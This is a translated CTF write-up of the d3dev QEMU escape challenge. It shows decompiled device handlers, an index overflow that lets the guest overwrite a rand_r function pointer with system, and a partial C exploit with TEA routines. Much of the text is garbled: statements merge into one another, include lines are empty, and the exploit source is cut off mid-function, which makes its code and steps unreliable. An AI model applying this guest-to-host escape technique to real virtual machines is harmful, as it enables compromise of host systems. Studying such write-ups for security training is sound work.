# AntCTFxD^3CTF pwn 分析
##### 译文声明
本文是翻译文章
译文仅供参考，具体内容表达以及含义原文为准。
## 前言
分享一下比赛中除了Deterministic Heap之外的 ~~六~~ 五道题。
## d3dev & d3dev_revenge
一道简单的qemu pwn，很适合入门，入门知识可参考[qemu-pwn-基础知识](https://ray-cp.github.io/archivers/qemu-pwn-basic-knowledge)，这里就不再赘述。
  1. 首先查看`launch.sh`启动脚本： 
        #!/bin/sh
    ./qemu-system-x86_64 \
    -L pc-bios/ \
    -m 128M \
    -kernel vmlinuz \
    -initrd rootfs.img \
    -smp 1 \
    -append "root=/dev/ram rw console=ttyS0 oops=panic panic=1 nokaslr quiet" \
    -device d3dev \
    -netdev user,id=t0, -device e1000,netdev=t0,id=nic0 \
    -nographic \
一般来说，从参数`-device d3dev`中可以得知，我们要分析的就是这个`d3dev`设备逻辑，而且通常就是这个设备中存在着漏洞。
  2. 分析所给的`qemu-system-x86_64`： 
        do_qemu_init_pci_d3dev_register_types
    d3dev_mmio_read
    d3dev_mmio_write
    d3dev_pmio_read
    pci_d3dev_register_types
    d3dev_class_init
    pci_d3dev_realize
    d3dev_instance_init
    d3dev_pmio_write
主要关注”d3dev”相关函数，从`d3dev_class_init`中，可以获得到`VenderID`以及`DeviceID`，从而找到目标PCI设备，从而获得相关的设备内存空间地址：
        / # lspci
    00:01.0 Class 0601: 8086:7000
    00:04.0 Class 0200: 8086:100e
    00:00.0 Class 0600: 8086:1237
    00:01.3 Class 0680: 8086:7113
    00:03.0 Class 00ff: 2333:11e8     ===> d3dev
    00:01.1 Class 0101: 8086:7010
    00:02.0 Class 0300: 1234:1111
    / # cat /sys/devices/pci0000\:00/0000:00\:03.0/resource
    0x00000000febf1000 0x00000000febf17ff 0x0000000000040200    ==> mmio (start end size)
    0x000000000000c040 0x000000000000c05f 0x0000000000040101    ==> pmio (start end size)
    0x0000000000000000 0x0000000000000000 0x0000000000000000
    0x0000000000000000 0x0000000000000000 0x0000000000000000
    0x0000000000000000 0x0000000000000000 0x0000000000000000
    0x0000000000000000 0x0000000000000000 0x0000000000000000
    0x0000000000000000 0x0000000000000000 0x0000000000000000
    0x0000000000000000 0x0000000000000000 0x0000000000000000
    0x0000000000000000 0x0000000000000000 0x0000000000000000
    0x0000000000000000 0x0000000000000000 0x0000000000000000
    0x0000000000000000 0x0000000000000000 0x0000000000000000
    0x0000000000000000 0x0000000000000000 0x0000000000000000
    0x0000000000000000 0x0000000000000000 0x0000000000000000
编写guest程序与设备交互的时候，可以直接映射设备地址，也可通过`int mmio_fd =
open("/sys/devices/pci0000:00/0000:00:03.0/resource0", O_RDWR |
O_SYNC);`来进行映射。
上图中两个地址分别对应mmio和pmio。
  3. 分析`d3dev_mmio_write`可以很容易发现： 
        void __fastcall d3dev_mmio_write(d3devState *opaque, hwaddr addr, uint64_t val, unsigned int size)
    {
      __int64 v4; // rsi
      ObjectClass_0 **v5; // r11
      uint64_t v6; // rdx
      int v7; // esi
      uint32_t v8; // er10
      uint32_t v9; // er9
      uint32_t v10; // er8
      uint32_t v11; // edi
      unsigned int v12; // ecx
      uint64_t v13; // rax
      if ( size == 4 )
      {
        v4 = opaque->seek + (unsigned int)(addr >> 3);
        if ( opaque->mmio_write_part )
        {
          v5 = &opaque->pdev.qdev.parent_obj.class + v4;
          v6 = val mmio_write_part = 0;
          v8 = opaque->key[0];
          v9 = opaque->key[1];
          v10 = opaque->key[2];
          v11 = opaque->key[3];
          v12 = v6 + *((_DWORD *)v5 + 0x2B6);
          v13 = ((unsigned __int64)v5[0x15B] + v6) >> 32;
          do
          {
            v7 -= 0x61C88647;
            v12 += (v7 + v13) ^ (v9 + ((unsigned int)v13 >> 5)) ^ (v8 + 16 * v13);
            LODWORD(v13) = ((v7 + v12) ^ (v11 + (v12 >> 5)) ^ (v10 + 16 * v12)) + v13;
          }
          while ( v7 != 0xC6EF3720 );
          v5[0x15B] = (ObjectClass_0 *)__PAIR64__(v13, v12);
        }
        else
        {
          opaque->mmio_write_part = 1;
          opaque->blocks[v4] = (unsigned int)val; // index overflow
        }
      }
    }
最后`opaque->blocks[v4] = (unsigned int)val;`存在下标溢出，即`v4 = opaque->seek +
(unsigned int)(addr >>
3);`，而`opaque->seek`可以通过`d3dev_pmio_write`进行设置，最大值为0x100，此时只要通过完全可控的addr，就能实现下标溢出。
        void __fastcall d3dev_pmio_write(d3devState *opaque, hwaddr addr, uint64_t val, unsigned int size)
    {
      uint32_t *v4; // rbp
      if ( addr == 8 )
      {
        if ( val seek = val;
      }
      else if ( addr > 8 )
      {
        if ( addr == 0x1C )
        {
          opaque->r_seed = val;
          v4 = opaque->key;
          do
            *v4++ = ((__int64 (__fastcall *)(uint32_t *, __int64, uint64_t, _QWORD))opaque->rand_r)(
                      &opaque->r_seed,
                      0x1CLL,
                      val,
                      *(_QWORD *)&size);
          while ( v4 != (uint32_t *)&opaque->rand_r );
        }
      }
      else if ( addr )
      {
        if ( addr == 4 )
        {
          *(_QWORD *)opaque->key = 0LL;
          *(_QWORD *)&opaque->key[2] = 0LL;
        }
      }
      else
      {
        opaque->memory_mode = val;
      }
    }
而继续分析相关结构体`d3devState`：
        00000000 d3devState      struc ; (sizeof=0x1300, align=0x10, copyof_4545)
    00000000 pdev            PCIDevice_0 ?
    000008E0 mmio            MemoryRegion_0 ?
    000009D0 pmio            MemoryRegion_0 ?
    00000AC0 memory_mode     dd ?
    00000AC4 seek            dd ?
    00000AC8 init_flag       dd ?
    00000ACC mmio_read_part  dd ?
    00000AD0 mmio_write_part dd ?
    00000AD4 r_seed          dd ?
    00000AD8 blocks          dq 257 dup(?)
    000012E0 key             dd 4 dup(?)
    000012F0 rand_r          dq ?                    ; offset
    000012F8                 db ? ; undefined
    000012F9                 db ? ; undefined
    000012FA                 db ? ; undefined
    000012FB                 db ? ; undefined
    000012FC                 db ? ; undefined
    000012FD                 db ? ; undefined
    000012FE                 db ? ; undefined
    000012FF                 db ? ; undefined
    00001300 d3devState      ends
可以看出，`blocks`后面存在着一个函数指针`rand_r`，而通过`d3dev_pmio_write`中`addr ==
0x1C`的情况，发现`rand_r`函数的第一个参数`r->seed`也是可控的，因此完全可以通过其实现调用`system("cat flag")`。
  4. 那么整个利用过程为： 
    * 通过调用`d3dev_pmio_write`，即`outw(0, 0xC040 + 0x4);`将`keys`全部设置为0。
    * 再通过调用`d3dev_pmio_write`，即`outw(0x100,d] = mmio_read(0x18); res[1] = mmio_read(0x18)`读出`rand_r`函数地址（TEA加密后的），再解密得到明文，算出libc的基地址。
    * 计算出`system`的地址，由于`d3dev_mmio_write`的写内存模式为：先写入低4 bytes，然后结合第二次传入的4 bytes作为高4 bytes组合成8 bytes，TEA加密（解密）后再写入对应内存中。所以只要先加密`system`的地址，然后分两次（先低后高）写入即可`opaque->rand_r`处即可。
    * 最后触发调用`rand_r`，即可得到flag。
  5. exp： 
        #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #define PAGE_SHIFT  12
    #define PAGE_SIZE   (1 > 9) & ~7;
        lseek(fd, offset, SEEK_SET);
        read(fd, &pme, 8);
        if (!(pme & PFN_PRESENT))
            return -1;
        gfn = pme & PFN_PFN;
        return gfn;
    }
    uint64_t gva_to_gpa(void *addr)
    {
        uint64_t gfn = gva_to_gfn(addr);
        assert(gfn != -1);
        return (gfn >5) + k1);
            v1 += ((v0>5) + k3);  
        }                                              /* end cycle */
        v[0]=v0; v[1]=v1;
    }
    void decrypt (uint32_t* v, uint32_t* k) {
        uint32_t v0=v[0], v1=v[1], sum=0xC6EF3720, i;  /* set up */